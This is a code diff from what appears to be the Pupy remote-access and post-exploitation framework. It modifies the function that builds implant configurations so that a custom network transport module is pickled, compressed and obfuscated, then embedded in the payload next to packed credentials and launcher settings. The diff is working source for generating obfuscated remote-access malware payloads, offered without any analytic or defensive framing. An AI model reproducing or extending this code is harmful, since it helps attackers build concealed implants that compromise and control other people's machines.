@@ -7,12 +7,14 @@ import logging, argparse, sys, os.path, re, shlex, random, string, zipfile, tarf
 from pupylib.utils.network import get_local_ip
 from pupylib.utils.term import colorize
 from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload
+from pupylib.payloads.python_packer import gen_package_pickled_dic
 from pupylib.utils.obfuscate import compress_encode_obfs
 from network.conf import transports, launchers
 from network.lib.base_launcher import LauncherError
 from scriptlets.scriptlets import ScriptletArgumentError
 import scriptlets
 import cPickle
+
 
 def get_edit_pupyx86_dll(conf):
     return get_edit_binary(os.path.join("payload_templates","pupyx86.dll"), conf)
@@ -66,6 +68,8 @@ def get_raw_conf(conf, obfuscate=False):
     l=launchers[conf['launcher']]()
     l.parse_args(conf['launcher_args'])
     t=transports[l.get_transport()]
+
+    #pack credentials
     creds_src=open("crypto/credentials.py","r").read()
     creds={}
     exec creds_src in {}, creds
@@ -79,6 +83,15 @@ def get_raw_conf(conf, obfuscate=False):
     pupy_credentials_mod={"pupy_credentials.py" : cred_src}
 
     new_conf+=compress_encode_obfs("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(pupy_credentials_mod)))+"\n"
+
+    #pack custom transport conf:
+    l.get_transport()
+    ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__)))
+    transport_conf_dic=gen_package_pickled_dic(ROOT+os.sep, "network.transports.%s"%l.get_transport())
+    #add custom transport and reload network conf
+    new_conf+=compress_encode_obfs("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(transport_conf_dic)))+"\nimport sys\nsys.modules.pop('network.conf')\nimport network.conf\n"
+    
+
     new_conf+=obf_func("LAUNCHER=%s"%(repr(conf['launcher'])))+"\n"
     new_conf+=obf_func("LAUNCHER_ARGS=%s"%(repr(conf['launcher_args'])))+"\n"
     new_conf+=offline_script
